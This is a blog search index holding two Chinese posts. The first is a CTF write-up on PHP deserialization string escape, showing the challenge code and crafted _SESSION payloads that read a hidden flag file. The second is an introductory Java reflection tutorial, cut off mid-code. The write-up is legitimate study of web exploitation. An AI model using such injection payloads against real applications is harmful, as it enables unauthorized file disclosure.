<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP反序列化之字符串逃逸（变短）</title>
    <link href="/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/"/>
    <url>/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化之字符逃逸（变短）"><a href="#PHP反序列化之字符逃逸（变短）" class="headerlink" title="PHP反序列化之字符逃逸（变短）"></a>PHP反序列化之字符逃逸（变短）</h1><p>今天做buuctf上得题时候，就来学习一下。搜寻资料此类题型有两种方法。</p><h2 id="替换修改后导致序列化字符串变长"><a href="#替换修改后导致序列化字符串变长" class="headerlink" title="替换修改后导致序列化字符串变长"></a>替换修改后导致序列化字符串变长</h2><p>目前还没有碰到。</p><h2 id="替换修改后导致序列化字符串边短"><a href="#替换修改后导致序列化字符串边短" class="headerlink" title="替换修改后导致序列化字符串边短"></a>替换修改后导致序列化字符串边短</h2><p>简单说一下。(如果不懂php反序列化就别往下看了)<br>首先我们要了解php反序列化后得字符串<strong>：PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的</strong></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456601.png" alt="QQ截图20220227142612"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;s:<span class="hljs-number">33</span>:<span class="hljs-string">&quot;stop water and stop power college&quot;</span>;&#125;&quot;<br></code></pre></td></tr></table></figure><p>那么什么叫字符串逃逸呢？</p><p><strong>首先第一点，在后续的利用过程中只会利用这一段。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>假如这里添加一层过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter_arr</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//这变成了一个正则表达式了哦</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>);<span class="hljs-comment">//看一下img里面有没有filter的东西，有的话，换成空格</span><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">filter</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271432213.png" alt="QQ截图20220227143230"></p><p>清楚可见这里得<code>phpflag</code>被过滤替换为空。这里实际的对应值如下。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">s<span class="hljs-number"> 7 </span>;s:31: <span class="hljs-comment">#第一个</span><br>s<span class="hljs-number"> 5 </span>xsw6a  <span class="hljs-comment">#第二个</span><br>s<span class="hljs-number"> 2 </span>zx     <span class="hljs-comment">#第三个</span><br>s<span class="hljs-number"> 1 </span>1      <span class="hljs-comment">#第四个</span><br></code></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456805.png" alt="QQ截图20220227143810"></h3><p>读代码。<br>依次分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤而已。</p><p><strong>补充</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456400.png" alt="QQ截图20220227144023"></p><p>如果键名包含数字好像这里绕不过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>销毁session。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br></code></pre></td></tr></table></figure><p>重新传入参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure><p>这个函数简单理解来说，就是可以直接覆盖上面的session值。本地实验如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271445397.png" alt="QQ截图20220227144500"></p><p>记住这一点很关键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是利用到上面将的：<strong>PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里进入phpinfo看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456509.png" alt="QQ截图20220227144911"></p><p>构造：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456115.png"></p><p>&#x2F;d0g3_fllllllag（将其base64）注意要加上<code>/</code>,弄了我半天。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456746.png" alt="QQ截图20220227145447"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初理解反射</title>
    <link href="/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="初理解反射"><a href="#初理解反射" class="headerlink" title="初理解反射"></a>初理解反射</h1><h2 id="理解反射"><a href="#理解反射" class="headerlink" title="理解反射"></a>理解反射</h2><p>Java中的反射机制是指<strong>在运行状态中</strong>，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p><p>这里的可以在运行状态中获取修改值很棒。以后的cc链就要用到。</p><h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class.forName(&quot;全类名&quot;) 该过程处于字节码阶段</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类名.class属性 该过程处于内存阶段</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//对象.getClass()方法 该过程处于运行阶段</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h2 id="类对象中有什么？"><a href="#类对象中有什么？" class="headerlink" title="类对象中有什么？"></a>类对象中有什么？</h2><ul><li>成员变量（Field对象，Field[] fields）</li><li>构造方法   (Constructor对象，Constructor[] cons)</li><li>成员方法  (Method对象，Method[] methods)</li></ul><h2 id="三种阶段"><a href="#三种阶段" class="headerlink" title="三种阶段"></a>三种阶段</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218849.png" alt="image-20200411205831842"></p><h3 id="source源代码阶段"><a href="#source源代码阶段" class="headerlink" title="source源代码阶段"></a>source源代码阶段</h3><p>此时刚刚编译为字节码，仍然保存在硬盘上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><h3 id="Class类对象阶段"><a href="#Class类对象阶段" class="headerlink" title="Class类对象阶段"></a>Class类对象阶段</h3><p>类加载器把Person.class字节码加载进内存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><h3 id="运行时阶段"><a href="#运行时阶段" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><p>这个时候类对象已经实例化成为了一个对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>使用Class.forName()会自动初始化该Class对象，Class.forName() 方法 当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。getDeclaredxxx 不能获取父类的方法。</li><li>使用类名.class来创建Class对象的引用时，不会自动初始化该Class对象</li><li>Class.forName() 属于动态加载类。将字节码文件加载进内存，参数需要类的全限定名</li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Person类"><a href="#Person类" class="headerlink" title="Person类"></a>Person类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;打篮球&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="反射获取"><a href="#反射获取" class="headerlink" title="反射获取"></a>反射获取</h3><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li>Fields[] getFields()：只能获取所有public修饰的成员变量</li><li>Fields getField(String name)：获取特定成员变量</li><li>Fields[] getDeclaredFields()：获取所有的成员变量，【不考虑】修饰符，不考虑继承</li><li>Fields getDeclaredField(String name)：获取特定的成员变量，【不考虑】修饰符，不考虑继承</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] fields = personClass.getFields();<br>        <span class="hljs-keyword">for</span>(Field field : fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只会获取public属性的成员变量。（不会有任何回显，该方法不会直接获取所有成员变量）。</p><p>想要获取所有成员变量如下(有回显)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] declaredFields = personClass.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field declaredField : declaredFields)&#123;<br>            System.out.println(declaredField);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252130870.png" alt="QQ截图20220225212503"></p><p>给Person类赋值（这里采用的是<code>getField</code>,只能采用重新设置public属性赋值）<br>修改<code>person</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String a;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setA</span><span 